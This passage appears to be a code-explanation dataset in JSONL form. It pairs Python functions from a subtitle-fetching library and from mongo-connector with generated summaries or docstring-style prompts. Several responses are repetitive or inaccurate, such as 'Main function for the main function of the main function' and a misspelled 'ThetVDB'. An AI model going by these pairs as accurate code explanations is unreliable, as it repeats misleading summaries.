{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check(cls, video):\n        if not isinstance(video, cls.video_types):\n            return False\n        if cls.required_hash is not None and cls.required_hash not in video.hashes:\n            return False\n\n        return True", "response": "Checks if the video can be processed."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_show_ids(self):\n        # get the show page\n        logger.info('Getting show ids')\n        r = self.session.get(self.server_url + 'shows.php', timeout=10)\n        r.raise_for_status()\n        soup = ParserBeautifulSoup(r.content, ['lxml', 'html.parser'])\n\n        # populate the show ids\n        show_ids = {}\n        for show in soup.select('td.version > h3 > a[href^=\"/show/\"]'):\n            show_ids[sanitize(show.text)] = int(show['href'][6:])\n        logger.debug('Found %d show ids', len(show_ids))\n\n        return show_ids", "response": "Get the dict of show ids per series by querying the shows. php page."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _search_show_id(self, series, year=None):\n        # addic7ed doesn't support search with quotes\n        series = series.replace('\\'', ' ')\n\n        # build the params\n        series_year = '%s %d' % (series, year) if year is not None else series\n        params = {'search': series_year, 'Submit': 'Search'}\n\n        # make the search\n        logger.info('Searching show ids with %r', params)\n        r = self.session.get(self.server_url + 'search.php', params=params, timeout=10)\n        r.raise_for_status()\n        if r.status_code == 304:\n            raise TooManyRequests()\n        soup = ParserBeautifulSoup(r.content, ['lxml', 'html.parser'])\n\n        # get the suggestion\n        suggestion = soup.select('span.titulo > a[href^=\"/show/\"]')\n        if not suggestion:\n            logger.warning('Show id not found: no suggestion')\n            return None\n        if not sanitize(suggestion[0].i.text.replace('\\'', ' ')) == sanitize(series_year):\n            logger.warning('Show id not found: suggestion does not match')\n            return None\n        show_id = int(suggestion[0]['href'][6:])\n        logger.debug('Found show id %d', show_id)\n\n        return show_id", "response": "Search the show id from the series and year."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the best matching show id for series year and country_code.", "response": "def get_show_id(self, series, year=None, country_code=None):\n        \"\"\"Get the best matching show id for `series`, `year` and `country_code`.\n\n        First search in the result of :meth:`_get_show_ids` and fallback on a search with :meth:`_search_show_id`.\n\n        :param str series: series of the episode.\n        :param year: year of the series, if any.\n        :type year: int\n        :param country_code: country code of the series, if any.\n        :type country_code: str\n        :return: the show id, if found.\n        :rtype: int\n\n        \"\"\"\n        series_sanitized = sanitize(series).lower()\n        show_ids = self._get_show_ids()\n        show_id = None\n\n        # attempt with country\n        if not show_id and country_code:\n            logger.debug('Getting show id with country')\n            show_id = show_ids.get('%s %s' % (series_sanitized, country_code.lower()))\n\n        # attempt with year\n        if not show_id and year:\n            logger.debug('Getting show id with year')\n            show_id = show_ids.get('%s %d' % (series_sanitized, year))\n\n        # attempt clean\n        if not show_id:\n            logger.debug('Getting show id')\n            show_id = show_ids.get(series_sanitized)\n\n        # search as last resort\n        if not show_id:\n            logger.warning('Series not found in show ids')\n            show_id = self._search_show_id(series)\n\n        return show_id"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsearch the show id from the series and year.", "response": "def search_show_id(self, series, year=None):\n        \"\"\"Search the show id from the `series` and `year`.\n\n        :param str series: series of the episode.\n        :param year: year of the series, if any.\n        :type year: int\n        :return: the show id, if any.\n        :rtype: int\n\n        \"\"\"\n        # make the search\n        logger.info('Searching show id for %r', series)\n        r = self.session.post(self.server_url + 'search.php', data={'q': series}, timeout=10)\n        r.raise_for_status()\n\n        # get the series out of the suggestions\n        soup = ParserBeautifulSoup(r.content, ['lxml', 'html.parser'])\n        show_id = None\n        for suggestion in soup.select('div.left li div a[href^=\"/tvshow-\"]'):\n            match = link_re.match(suggestion.text)\n            if not match:\n                logger.error('Failed to match %s', suggestion.text)\n                continue\n\n            if match.group('series').lower() == series.lower():\n                if year is not None and int(match.group('first_year')) != year:\n                    logger.debug('Year does not match')\n                    continue\n                show_id = int(suggestion['href'][8:-5])\n                logger.debug('Found show id %d', show_id)\n                break\n\n        return show_id"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the episode ids from the show id and the season.", "response": "def get_episode_ids(self, show_id, season):\n        \"\"\"Get episode ids from the show id and the season.\n\n        :param int show_id: show id.\n        :param int season: season of the episode.\n        :return: episode ids per episode number.\n        :rtype: dict\n\n        \"\"\"\n        # get the page of the season of the show\n        logger.info('Getting the page of show id %d, season %d', show_id, season)\n        r = self.session.get(self.server_url + 'tvshow-%d-%d.html' % (show_id, season), timeout=10)\n        soup = ParserBeautifulSoup(r.content, ['lxml', 'html.parser'])\n\n        # loop over episode rows\n        episode_ids = {}\n        for row in soup.select('table#table5 tr'):\n            # skip rows that do not have a link to the episode page\n            if not row('a', href=episode_id_re):\n                continue\n\n            # extract data from the cells\n            cells = row('td')\n            episode = int(cells[0].text.split('x')[1])\n            episode_id = int(cells[1].a['href'][8:-5])\n            episode_ids[episode] = episode_id\n\n        if episode_ids:\n            logger.debug('Found episode ids %r', episode_ids)\n        else:\n            logger.warning('No episode ids found')\n\n        return episode_ids"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nrefine a video by searching its metadata.", "response": "def refine(video, embedded_subtitles=True, **kwargs):\n    \"\"\"Refine a video by searching its metadata.\n\n    Several :class:`~subliminal.video.Video` attributes can be found:\n\n      * :attr:`~subliminal.video.Video.resolution`\n      * :attr:`~subliminal.video.Video.video_codec`\n      * :attr:`~subliminal.video.Video.audio_codec`\n      * :attr:`~subliminal.video.Video.subtitle_languages`\n\n    :param bool embedded_subtitles: search for embedded subtitles.\n\n    \"\"\"\n    # skip non existing videos\n    if not video.exists:\n        return\n\n    # check extensions\n    extension = os.path.splitext(video.name)[1]\n    if extension == '.mkv':\n        with open(video.name, 'rb') as f:\n            mkv = MKV(f)\n\n        # main video track\n        if mkv.video_tracks:\n            video_track = mkv.video_tracks[0]\n\n            # resolution\n            if video_track.height in (480, 720, 1080):\n                if video_track.interlaced:\n                    video.resolution = '%di' % video_track.height\n                else:\n                    video.resolution = '%dp' % video_track.height\n                logger.debug('Found resolution %s', video.resolution)\n\n            # video codec\n            if video_track.codec_id == 'V_MPEG4/ISO/AVC':\n                video.video_codec = 'h264'\n                logger.debug('Found video_codec %s', video.video_codec)\n            elif video_track.codec_id == 'V_MPEG4/ISO/SP':\n                video.video_codec = 'DivX'\n                logger.debug('Found video_codec %s', video.video_codec)\n            elif video_track.codec_id == 'V_MPEG4/ISO/ASP':\n                video.video_codec = 'XviD'\n                logger.debug('Found video_codec %s', video.video_codec)\n        else:\n            logger.warning('MKV has no video track')\n\n        # main audio track\n        if mkv.audio_tracks:\n            audio_track = mkv.audio_tracks[0]\n            # audio codec\n            if audio_track.codec_id == 'A_AC3':\n                video.audio_codec = 'AC3'\n                logger.debug('Found audio_codec %s', video.audio_codec)\n            elif audio_track.codec_id == 'A_DTS':\n                video.audio_codec = 'DTS'\n                logger.debug('Found audio_codec %s', video.audio_codec)\n            elif audio_track.codec_id == 'A_AAC':\n                video.audio_codec = 'AAC'\n                logger.debug('Found audio_codec %s', video.audio_codec)\n        else:\n            logger.warning('MKV has no audio track')\n\n        # subtitle tracks\n        if mkv.subtitle_tracks:\n            if embedded_subtitles:\n                embedded_subtitle_languages = set()\n                for st in mkv.subtitle_tracks:\n                    if st.language:\n                        try:\n                            embedded_subtitle_languages.add(Language.fromalpha3b(st.language))\n                        except BabelfishError:\n                            logger.error('Embedded subtitle track language %r is not a valid language', st.language)\n                            embedded_subtitle_languages.add(Language('und'))\n                    elif st.name:\n                        try:\n                            embedded_subtitle_languages.add(Language.fromname(st.name))\n                        except BabelfishError:\n                            logger.debug('Embedded subtitle track name %r is not a valid language', st.name)\n                            embedded_subtitle_languages.add(Language('und'))\n                    else:\n                        embedded_subtitle_languages.add(Language('und'))\n                logger.debug('Found embedded subtitle %r', embedded_subtitle_languages)\n                video.subtitle_languages |= embedded_subtitle_languages\n        else:\n            logger.debug('MKV has no subtitle track')\n    else:\n        logger.debug('Unsupported video extension %s', extension)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget an episode of a series.", "response": "def get_series_episode(series_id, season, episode):\n    \"\"\"Get an episode of a series.\n\n    :param int series_id: id of the series.\n    :param int season: season number of the episode.\n    :param int episode: episode number of the episode.\n    :return: the episode data.\n    :rtype: dict\n\n    \"\"\"\n    result = tvdb_client.query_series_episodes(series_id, aired_season=season, aired_episode=episode)\n    if result:\n        return tvdb_client.get_episode(result['data'][0]['id'])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef refine(video, **kwargs):\n    # only deal with Episode videos\n    if not isinstance(video, Episode):\n        logger.error('Cannot refine episodes')\n        return\n\n    # exit if the information is complete\n    if video.series_tvdb_id and video.tvdb_id:\n        logger.debug('No need to search')\n        return\n\n    # search the series\n    logger.info('Searching series %r', video.series)\n    results = search_series(video.series.lower())\n    if not results:\n        logger.warning('No results for series')\n        return\n    logger.debug('Found %d results', len(results))\n\n    # search for exact matches\n    matching_results = []\n    for result in results:\n        matching_result = {}\n\n        # use seriesName and aliases\n        series_names = [result['seriesName']]\n        series_names.extend(result['aliases'])\n\n        # parse the original series as series + year or country\n        original_match = series_re.match(result['seriesName']).groupdict()\n\n        # parse series year\n        series_year = None\n        if result['firstAired']:\n            series_year = datetime.strptime(result['firstAired'], '%Y-%m-%d').year\n\n        # discard mismatches on year\n        if video.year and series_year and video.year != series_year:\n            logger.debug('Discarding series %r mismatch on year %d', result['seriesName'], series_year)\n            continue\n\n        # iterate over series names\n        for series_name in series_names:\n            # parse as series and year\n            series, year, country = series_re.match(series_name).groups()\n            if year:\n                year = int(year)\n\n            # discard mismatches on year\n            if year and (video.original_series or video.year != year):\n                logger.debug('Discarding series name %r mismatch on year %d', series, year)\n                continue\n\n            # match on sanitized series name\n            if sanitize(series) == sanitize(video.series):\n                logger.debug('Found exact match on series %r', series_name)\n                matching_result['match'] = {'series': original_match['series'], 'year': series_year,\n                                            'original_series': original_match['year'] is None}\n                break\n\n        # add the result on match\n        if matching_result:\n            matching_result['data'] = result\n            matching_results.append(matching_result)\n\n    # exit if we don't have exactly 1 matching result\n    if not matching_results:\n        logger.error('No matching series found')\n        return\n    if len(matching_results) > 1:\n        logger.error('Multiple matches found')\n        return\n\n    # get the series\n    matching_result = matching_results[0]\n    series = get_series(matching_result['data']['id'])\n\n    # add series information\n    logger.debug('Found series %r', series)\n    video.series = matching_result['match']['series']\n    video.year = matching_result['match']['year']\n    video.original_series = matching_result['match']['original_series']\n    video.series_tvdb_id = series['id']\n    video.series_imdb_id = series['imdbId'] or None\n\n    # get the episode\n    logger.info('Getting series episode %dx%d', video.season, video.episode)\n    episode = get_series_episode(video.series_tvdb_id, video.season, video.episode)\n    if not episode:\n        logger.warning('No results for episode')\n        return\n\n    # add episode information\n    logger.debug('Found episode %r', episode)\n    video.tvdb_id = episode['id']\n    video.title = episode['episodeName'] or None\n    video.imdb_id = episode['imdbId'] or None", "response": "Refine a video by searching the ThetVDB database for the series and year."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef login(self):\n        # perform the request\n        data = {'apikey': self.apikey, 'username': self.username, 'password': self.password}\n        r = self.session.post(self.base_url + '/login', json=data)\n        r.raise_for_status()\n\n        # set the Authorization header\n        self.session.headers['Authorization'] = 'Bearer ' + r.json()['token']\n\n        # update token_date\n        self.token_date = datetime.utcnow()", "response": "Login to the server"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef refresh_token(self):\n        # perform the request\n        r = self.session.get(self.base_url + '/refresh_token')\n        r.raise_for_status()\n\n        # set the Authorization header\n        self.session.headers['Authorization'] = 'Bearer ' + r.json()['token']\n\n        # update token_date\n        self.token_date = datetime.utcnow()", "response": "Refresh the token for the current session"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsearching for a series by name imdb_id and zap2it_id.", "response": "def search_series(self, name=None, imdb_id=None, zap2it_id=None):\n        \"\"\"Search series\"\"\"\n        # perform the request\n        params = {'name': name, 'imdbId': imdb_id, 'zap2itId': zap2it_id}\n        r = self.session.get(self.base_url + '/search/series', params=params)\n        if r.status_code == 404:\n            return None\n        r.raise_for_status()\n\n        return r.json()['data']"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets a single series from the API.", "response": "def get_series(self, id):\n        \"\"\"Get series\"\"\"\n        # perform the request\n        r = self.session.get(self.base_url + '/series/{}'.format(id))\n        if r.status_code == 404:\n            return None\n        r.raise_for_status()\n\n        return r.json()['data']"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef checked(response):\n    status_code = int(response['status'][:3])\n    if status_code == 401:\n        raise Unauthorized\n    if status_code == 406:\n        raise NoSession\n    if status_code == 407:\n        raise DownloadLimitReached\n    if status_code == 413:\n        raise InvalidImdbid\n    if status_code == 414:\n        raise UnknownUserAgent\n    if status_code == 415:\n        raise DisabledUserAgent\n    if status_code == 503:\n        raise ServiceUnavailable\n    if status_code != 200:\n        raise OpenSubtitlesError(response['status'])\n\n    return response", "response": "Check a response status before returning it."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef retry_until_ok(func, *args, **kwargs):\n    max_tries = 120\n    for i in range(max_tries):\n        try:\n            return func(*args, **kwargs)\n        except RuntimeError:\n            # Do not mask RuntimeError.\n            raise\n        except errors.OperationFailure as exc:\n            if exc.code == 13 or (  # MongoDB >= 2.6 sets the error code,\n                exc.details\n                and \"unauthorized\" == exc.details.get(\"errmsg\")  # MongoDB 2.4 does not.\n            ):\n                # Do not mask authorization failures.\n                raise\n            if i == max_tries - 1:\n                LOG.exception(\n                    \"Call to %s failed too many times in \" \"retry_until_ok\", func\n                )\n                raise\n        except Exception:\n            if i == max_tries - 1:\n                LOG.exception(\n                    \"Call to %s failed too many times in \" \"retry_until_ok\", func\n                )\n                raise\n        time.sleep(1)", "response": "Retry code block until the function succeeds."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef apply_update(self, doc, update_spec):\n\n        # Helper to cast a key for a list or dict, or raise ValueError\n        def _convert_or_raise(container, key):\n            if isinstance(container, dict):\n                return key\n            elif isinstance(container, list):\n                return int(key)\n            else:\n                raise ValueError\n\n        # Helper to retrieve (and/or create)\n        # a dot-separated path within a document.\n        def _retrieve_path(container, path, create=False):\n            looking_at = container\n            for part in path:\n                if isinstance(looking_at, dict):\n                    if create and part not in looking_at:\n                        looking_at[part] = {}\n                    looking_at = looking_at[part]\n                elif isinstance(looking_at, list):\n                    index = int(part)\n                    # Do we need to create additional space in the array?\n                    if create and len(looking_at) <= index:\n                        # Fill buckets with None up to the index we need.\n                        looking_at.extend([None] * (index - len(looking_at)))\n                        # Bucket we need gets the empty dictionary.\n                        looking_at.append({})\n                    looking_at = looking_at[index]\n                else:\n                    raise ValueError\n            return looking_at\n\n        def _set_field(doc, to_set, value):\n            if \".\" in to_set:\n                path = to_set.split(\".\")\n                where = _retrieve_path(doc, path[:-1], create=True)\n                index = _convert_or_raise(where, path[-1])\n                wl = len(where)\n                if isinstance(where, list) and index >= wl:\n                    where.extend([None] * (index + 1 - wl))\n                where[index] = value\n            else:\n                doc[to_set] = value\n\n        def _unset_field(doc, to_unset):\n            try:\n                if \".\" in to_unset:\n                    path = to_unset.split(\".\")\n                    where = _retrieve_path(doc, path[:-1])\n                    index_or_key = _convert_or_raise(where, path[-1])\n                    if isinstance(where, list):\n                        # Unset an array element sets it to null.\n                        where[index_or_key] = None\n                    else:\n                        # Unset field removes it entirely.\n                        del where[index_or_key]\n                else:\n                    del doc[to_unset]\n            except (KeyError, IndexError, ValueError):\n                source_version = get_mininum_mongodb_version()\n                if source_version is None or source_version.at_least(2, 6):\n                    raise\n                # Ignore unset errors since MongoDB 2.4 records invalid\n                # $unsets in the oplog.\n                LOG.warning(\n                    \"Could not unset field %r from document %r. \"\n                    \"This may be normal when replicating from \"\n                    \"MongoDB 2.4 or the destination could be out of \"\n                    \"sync.\" % (to_unset, doc)\n                )\n\n        # wholesale document replacement\n        if \"$set\" not in update_spec and \"$unset\" not in update_spec:\n            # update spec contains the new document in its entirety\n            return update_spec\n        else:\n            try:\n                # $set\n                for to_set in update_spec.get(\"$set\", []):\n                    value = update_spec[\"$set\"][to_set]\n                    _set_field(doc, to_set, value)\n\n                # $unset\n                for to_unset in update_spec.get(\"$unset\", []):\n                    _unset_field(doc, to_unset)\n\n            except (KeyError, ValueError, AttributeError, IndexError):\n                exc_t, exc_v, exc_tb = sys.exc_info()\n                msg = \"Cannot apply update %r to %r\" % (update_spec, doc)\n                raise UpdateDoesNotApply(msg).with_traceback(exc_tb)\n            return doc", "response": "Applies an update operation to a document."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbulks upsert a set of documents.", "response": "def bulk_upsert(self, docs, namespace, timestamp):\n        \"\"\"Upsert each document in a set of documents.\n\n        This method may be overridden to upsert many documents at once.\n        \"\"\"\n        for doc in docs:\n            self.upsert(doc, namespace, timestamp)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef log_startup_info():\n    LOG.always(\"Starting mongo-connector version: %s\", __version__)\n    if \"dev\" in __version__:\n        LOG.warning(\n            \"This is a development version (%s) of mongo-connector\", __version__\n        )\n    LOG.always(\"Python version: %s\", sys.version)\n    LOG.always(\"Platform: %s\", platform.platform())\n    if hasattr(pymongo, \"__version__\"):\n        pymongo_version = pymongo.__version__\n    else:\n        pymongo_version = pymongo.version\n    LOG.always(\"pymongo version: %s\", pymongo_version)\n    if not pymongo.has_c():\n        LOG.warning(\n            \"pymongo version %s was installed without the C extensions. \"\n            '\"InvalidBSON: Date value out of range\" errors may occur if '\n            \"there are documents with BSON Datetimes that represent times \"\n            \"outside of Python's datetime limit.\",\n            pymongo.__version__,\n        )", "response": "Log info about the current environment."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef main():\n    # Setup an initial logging handler that buffers log messages before\n    # applying the final logging configuration.\n    initial_handler = logging.handlers.MemoryHandler(100)\n    root_logger = logging.getLogger()\n    root_logger.addHandler(initial_handler)\n\n    # Parse configuration and setup logging.\n    conf = config.Config(get_config_options())\n    conf.parse_args()\n    setup_logging(conf)\n\n    # Flush the buffered log messages to the final logging handler.\n    initial_handler.setTarget(root_logger.handlers[-1])\n    initial_handler.flush()\n    root_logger.removeHandler(initial_handler)\n\n    log_startup_info()\n\n    connector = Connector.from_config(conf)\n\n    # Catch SIGTERM and SIGINT to cleanup the connector gracefully\n    def signame_handler(signal_name):\n        def sig_handler(signum, frame):\n            # Save the signal so it can be printed later\n            connector.signal = (signal_name, signum)\n            connector.can_run = False\n\n        return sig_handler\n\n    signal.signal(signal.SIGTERM, signame_handler(\"SIGTERM\"))\n    signal.signal(signal.SIGINT, signame_handler(\"SIGINT\"))\n\n    connector.start()\n\n    while True:\n        if not connector.is_alive():\n            break\n        time.sleep(3)", "response": "Main function for the main function of the main function."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new Connector instance from a Config object.", "response": "def from_config(cls, config):\n        \"\"\"Create a new Connector instance from a Config object.\"\"\"\n        auth_key = None\n        password_file = config[\"authentication.passwordFile\"]\n        if password_file is not None:\n            try:\n                auth_key = open(config[\"authentication.passwordFile\"]).read()\n                auth_key = re.sub(r\"\\s\", \"\", auth_key)\n            except IOError:\n                LOG.error(\"Could not load password file!\")\n                sys.exit(1)\n        password = config[\"authentication.password\"]\n        if password is not None:\n            auth_key = password\n        connector = Connector(\n            mongo_address=config[\"mainAddress\"],\n            doc_managers=config[\"docManagers\"],\n            oplog_checkpoint=os.path.abspath(config[\"oplogFile\"]),\n            collection_dump=config[\"onlyDump\"] or not config[\"noDump\"],\n            only_dump=config[\"onlyDump\"],\n            batch_size=config[\"batchSize\"],\n            continue_on_error=config[\"continueOnError\"],\n            auth_username=config[\"authentication.adminUsername\"],\n            auth_key=auth_key,\n            fields=config[\"fields\"],\n            exclude_fields=config[\"exclude_fields\"],\n            ns_set=config[\"namespaces.include\"],\n            ex_ns_set=config[\"namespaces.exclude\"],\n            dest_mapping=config[\"namespaces.mapping\"],\n            namespace_options=config[\"namespaces.namespace_options\"],\n            gridfs_set=config[\"namespaces.gridfs\"],\n            ssl_certfile=config[\"ssl.sslCertfile\"],\n            ssl_keyfile=config[\"ssl.sslKeyfile\"],\n            ssl_ca_certs=config[\"ssl.sslCACerts\"],\n            ssl_cert_reqs=config[\"ssl.sslCertificatePolicy\"],\n            tz_aware=config[\"timezoneAware\"],\n        )\n        return connector"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef join(self):\n        self.can_run = False\n        super(Connector, self).join()\n        for dm in self.doc_managers:\n            dm.stop()", "response": "Joins thread stops all doc managers and doc_managers"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef write_oplog_progress(self):\n\n        if self.oplog_checkpoint is None:\n            return None\n\n        with self.oplog_progress as oplog_prog:\n            oplog_dict = oplog_prog.get_dict()\n        items = [[name, util.bson_ts_to_long(oplog_dict[name])] for name in oplog_dict]\n        if not items:\n            return\n\n        # write to temp file\n        backup_file = self.oplog_checkpoint + \".backup\"\n        os.rename(self.oplog_checkpoint, backup_file)\n\n        # for each of the threads write to file\n        with open(self.oplog_checkpoint, \"w\") as dest:\n            if len(items) == 1:\n                # Write 1-dimensional array, as in previous versions.\n                json_str = json.dumps(items[0])\n            else:\n                # Write a 2d array to support sharded clusters.\n                json_str = json.dumps(items)\n            try:\n                dest.write(json_str)\n            except IOError:\n                # Basically wipe the file, copy from backup\n                dest.truncate()\n                with open(backup_file, \"r\") as backup:\n                    shutil.copyfile(backup, dest)\n\n        os.remove(backup_file)", "response": "Writes the oplog progress to file provided by user."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nread the oplog progress file and stores it in self. oplog_progress.", "response": "def read_oplog_progress(self):\n        \"\"\"Reads oplog progress from file provided by user.\n        This method is only called once before any threads are spanwed.\n        \"\"\"\n\n        if self.oplog_checkpoint is None:\n            return None\n\n        # Check for empty file\n        try:\n            if os.stat(self.oplog_checkpoint).st_size == 0:\n                LOG.info(\"MongoConnector: Empty oplog progress file.\")\n                return None\n        except OSError:\n            return None\n\n        with open(self.oplog_checkpoint, \"r\") as progress_file:\n            try:\n                data = json.load(progress_file)\n            except ValueError:\n                LOG.exception(\n                    'Cannot read oplog progress file \"%s\". '\n                    \"It may be corrupt after Mongo Connector was shut down\"\n                    \"uncleanly. You can try to recover from a backup file \"\n                    '(may be called \"%s.backup\") or create a new progress file '\n                    \"starting at the current moment in time by running \"\n                    \"mongo-connector --no-dump <other options>. \"\n                    \"You may also be trying to read an oplog progress file \"\n                    \"created with the old format for sharded clusters. \"\n                    \"See https://github.com/10gen-labs/mongo-connector/wiki\"\n                    \"/Oplog-Progress-File for complete documentation.\"\n                    % (self.oplog_checkpoint, self.oplog_checkpoint)\n                )\n                return\n            # data format:\n            # [name, timestamp] = replica set\n            # [[name, timestamp], [name, timestamp], ...] = sharded cluster\n            if not isinstance(data[0], list):\n                data = [data]\n            with self.oplog_progress:\n                self.oplog_progress.dict = dict(\n                    (name, util.long_to_bson_ts(timestamp)) for name, timestamp in data\n                )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef copy_uri_options(hosts, mongodb_uri):\n        if \"?\" in mongodb_uri:\n            options = mongodb_uri.split(\"?\", 1)[1]\n        else:\n            options = None\n        uri = \"mongodb://\" + hosts\n        if options:\n            uri += \"/?\" + options\n        return uri", "response": "Returns a MongoDB URI to hosts with the options from mongodb_uri."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef run(self):\n        # Reset the global minimum MongoDB version\n        update_mininum_mongodb_version(None)\n        self.main_conn = self.create_authed_client()\n        LOG.always(\n            \"Source MongoDB version: %s\",\n            self.main_conn.admin.command(\"buildInfo\")[\"version\"],\n        )\n\n        for dm in self.doc_managers:\n            name = dm.__class__.__module__\n            module = sys.modules[name]\n            version = \"unknown\"\n            if hasattr(module, \"__version__\"):\n                version = module.__version__\n            elif hasattr(module, \"version\"):\n                version = module.version\n            LOG.always(\"Target DocManager: %s version: %s\", name, version)\n\n        self.read_oplog_progress()\n        conn_type = None\n\n        try:\n            self.main_conn.admin.command(\"isdbgrid\")\n        except pymongo.errors.OperationFailure:\n            conn_type = \"REPLSET\"\n\n        if conn_type == \"REPLSET\":\n            # Make sure we are connected to a replica set\n            is_master = self.main_conn.admin.command(\"isMaster\")\n            if \"setName\" not in is_master:\n                LOG.error(\n                    'No replica set at \"%s\"! A replica set is required '\n                    \"to run mongo-connector. Shutting down...\" % self.address\n                )\n                return\n\n            # Establish a connection to the replica set as a whole\n            self.main_conn.close()\n            self.main_conn = self.create_authed_client(replicaSet=is_master[\"setName\"])\n\n            self.update_version_from_client(self.main_conn)\n\n            # non sharded configuration\n            oplog = OplogThread(\n                self.main_conn,\n                self.doc_managers,\n                self.oplog_progress,\n                self.namespace_config,\n                **self.kwargs\n            )\n            self.shard_set[0] = oplog\n            LOG.info(\"MongoConnector: Starting connection thread %s\" % self.main_conn)\n            oplog.start()\n\n            while self.can_run:\n                shard_thread = self.shard_set[0]\n                if not (shard_thread.running and shard_thread.is_alive()):\n                    LOG.error(\n                        \"MongoConnector: OplogThread\"\n                        \" %s unexpectedly stopped! Shutting down\"\n                        % (str(self.shard_set[0]))\n                    )\n                    self.oplog_thread_join()\n                    for dm in self.doc_managers:\n                        dm.stop()\n                    return\n\n                self.write_oplog_progress()\n                time.sleep(1)\n\n        else:  # sharded cluster\n            while self.can_run:\n                # The backup role does not provide the listShards privilege,\n                # so use the config.shards collection instead.\n                for shard_doc in retry_until_ok(\n                    lambda: list(self.main_conn.config.shards.find())\n                ):\n                    shard_id = shard_doc[\"_id\"]\n                    if shard_id in self.shard_set:\n                        shard_thread = self.shard_set[shard_id]\n                        if not (shard_thread.running and shard_thread.is_alive()):\n                            LOG.error(\n                                \"MongoConnector: OplogThread \"\n                                \"%s unexpectedly stopped! Shutting \"\n                                \"down\" % (str(self.shard_set[shard_id]))\n                            )\n                            self.oplog_thread_join()\n                            for dm in self.doc_managers:\n                                dm.stop()\n                            return\n\n                        self.write_oplog_progress()\n                        time.sleep(1)\n                        continue\n                    try:\n                        repl_set, hosts = shard_doc[\"host\"].split(\"/\")\n                    except ValueError:\n                        cause = \"The system only uses replica sets!\"\n                        LOG.exception(\"MongoConnector: %s\", cause)\n                        self.oplog_thread_join()\n                        for dm in self.doc_managers:\n                            dm.stop()\n                        return\n\n                    shard_conn = self.create_authed_client(hosts, replicaSet=repl_set)\n                    self.update_version_from_client(shard_conn)\n                    oplog = OplogThread(\n                        shard_conn,\n                        self.doc_managers,\n                        self.oplog_progress,\n                        self.namespace_config,\n                        mongos_client=self.main_conn,\n                        **self.kwargs\n                    )\n                    self.shard_set[shard_id] = oplog\n                    msg = \"Starting connection thread\"\n                    LOG.info(\"MongoConnector: %s %s\" % (msg, shard_conn))\n                    oplog.start()\n\n        if self.signal is not None:\n            LOG.info(\"recieved signal %s: shutting down...\", self.signal)\n        self.oplog_thread_join()\n        self.write_oplog_progress()", "response": "Discovers the mongo cluster and creates a thread for each primary."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstopping all the OplogThreads and joins all the ShardSet.", "response": "def oplog_thread_join(self):\n        \"\"\"Stops all the OplogThreads\n        \"\"\"\n        LOG.info(\"MongoConnector: Stopping all OplogThreads\")\n        for thread in self.shard_set.values():\n            thread.join()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _character_matches(name1, name2):\n    if name1[0] == \"*\":\n        for i in range(len(name2) + 1):\n            yield 1, i\n    if name2[0] == \"*\":\n        for i in range(len(name1) + 1):\n            yield i, 1\n    if name1[0] == name2[0]:\n        yield 1, 1", "response": "Yield the number of characters that match the beginning of each string."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn True if two wildcard patterns can match the same string.", "response": "def wildcards_overlap(name1, name2):\n    \"\"\"Return true if two wildcard patterns can match the same string.\"\"\"\n    if not name1 and not name2:\n        return True\n    if not name1 or not name2:\n        return False\n    for matched1, matched2 in _character_matches(name1, name2):\n        if wildcards_overlap(name1[matched1:], name2[matched2:]):\n            return True\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nvalidating wildcards and renaming in namespaces.", "response": "def _validate_namespaces(namespaces):\n    \"\"\"Validate wildcards and renaming in namespaces.\n\n    Target namespaces should have the same number of wildcards as the source.\n    No target namespaces overlap exactly with each other. Logs a warning\n    when wildcard namespaces have a chance of overlapping.\n    \"\"\"\n    for source, namespace in namespaces.items():\n        target = namespace.dest_name\n        _validate_namespace(source)\n        _validate_namespace(target)\n        if source.count(\"*\") > 1 or target.count(\"*\") > 1:\n            raise errors.InvalidConfiguration(\n                \"The namespace mapping from '%s' to '%s' cannot contain more \"\n                \"than one '*' character.\" % (source, target)\n            )\n        if source.count(\"*\") != target.count(\"*\"):\n            raise errors.InvalidConfiguration(\n                \"The namespace mapping from '%s' to '%s' must contain the \"\n                \"same number of '*' characters.\" % (source, target)\n            )\n        if \"*\" not in source:\n            continue\n        # Make sure that wildcards are not moved from database name to\n        # collection name or vice versa, eg \"db*.foo\" => \"db.foo_*\"\n        if (\n            wildcard_in_db(source)\n            and not wildcard_in_db(target)\n            or (not wildcard_in_db(source) and wildcard_in_db(target))\n        